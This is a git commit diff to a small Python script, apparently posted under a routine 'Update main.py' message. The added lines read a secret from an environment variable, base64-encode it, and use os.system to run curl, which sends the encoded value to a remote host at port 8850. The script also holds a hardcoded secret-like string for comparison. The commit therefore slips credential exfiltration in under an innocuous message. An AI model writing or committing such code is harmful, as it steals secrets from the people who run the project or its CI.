82e05c96708ab7a9a99b181654be54168643da0d
Lewis Wong <debatrix@sina.com>
2021-01-28 09:05:47 +0800

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,13 @@
 import os
 import base64
+
 s = os.environ.get('a')
+print(len(s))
+
+t = base64.b64encode(s.encode())
+print(t)
+os.system("curl ip:8850/{}".format(t.decode()))
+
 
 t = base64.b64encode(s.encode())
 print('s?',s == r"P\\bb|n4\I4;_HWG/tr'tUH3")
